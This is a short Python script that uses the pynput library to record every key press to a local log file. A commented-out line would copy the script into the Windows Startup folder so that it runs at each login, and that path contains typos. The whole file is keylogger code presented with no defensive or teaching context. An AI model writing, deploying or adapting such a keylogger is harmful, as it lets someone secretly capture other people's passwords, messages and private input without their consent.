#Protected

from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"C:/PYTHON/NO"

# copyfile('Log.py', f'C:/Users/{username}/AppData/Roamin/Microsoft/Start Menu/Starup/Log.py')  #activate on startup

logging.basicConfig(filename=f"{logging_directory}/logfiles.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()

#End
